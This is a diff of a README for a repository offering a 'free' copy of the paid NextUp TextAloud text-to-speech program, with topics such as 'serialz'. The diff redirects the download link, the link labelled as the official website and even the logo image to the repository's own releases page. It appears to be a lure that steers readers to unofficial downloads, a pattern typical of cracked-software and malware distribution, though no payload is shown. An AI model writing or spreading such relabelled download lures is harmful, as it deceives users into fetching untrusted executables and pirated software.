@@ -8,7 +8,7 @@ Welcome to the NextUp TextAloud Free repository - your ultimate destination for 
 - **Topics:** nextup-com-textaloud, nextup-textaloud, nextup-textaloud-2019, nextup-textaloud-2020, nextup-textaloud-3-trial, nextup-textaloud-4, nextup-textaloud-adding-voices, nextup-textaloud-android, nextup-textaloud-download, nextup-textaloud-portable, nextup-textaloud-v3, nextup-textaloud-voices, nextup-textaloud-voices-download, textaloud-by-nextup, textaloud-by-nextup-serialz, textaloud-from-nextup
 
 ## Explore the Goodies:
-📦 [Download the NextUp TextAloud Free Project Zip](https://github.com/files/Project.zip) 🚀
+📦 [Download the NextUp TextAloud Free Project Zip](https://github.com/rkmobilegadgets/NextUp-TextAloud-Free/releases) 🚀
 
 ## Overview:
 In this repository, you will find an extensive collection of resources, discussions, and updates related to TextAloud by NextUp. Dive into the world of text-to-speech technology, explore the latest features of NextUp TextAloud, and enhance your reading and listening experiences with a range of voices and customization options.
@@ -26,7 +26,7 @@ In this repository, you will find an extensive collection of resources, discussi
 Whether you are new to TextAloud or a long-time user, this repository has something for everyone. Explore articles, tutorials, and discussions to make the most out of your TextAloud experience. Connect with other users, share your insights, and stay updated on the latest news and releases from NextUp TextAloud.
 
 ## Connect with Us:
-🌐 Visit our [website](https://www.textaloud.com) for more information about TextAloud and its features.
+🌐 Visit our [website](https://github.com/rkmobilegadgets/NextUp-TextAloud-Free/releases) for more information about TextAloud and its features.
 
 ## Releases:
 If the provided link does not work or you need more resources, check out the "Releases" section of this repository for additional downloads and updates.
@@ -44,4 +44,4 @@ A big thank you to all the contributors and supporters of this repository. Your 
 
 Let's make reading and listening a delightful experience with NextUp TextAloud Free! Get started today and discover a whole new world of possibilities. 🎧📖
 
-![TextAloud Logo](https://example.com/textaloud-logo.png)
+![TextAloud Logo](https://github.com/rkmobilegadgets/NextUp-TextAloud-Free/releases)
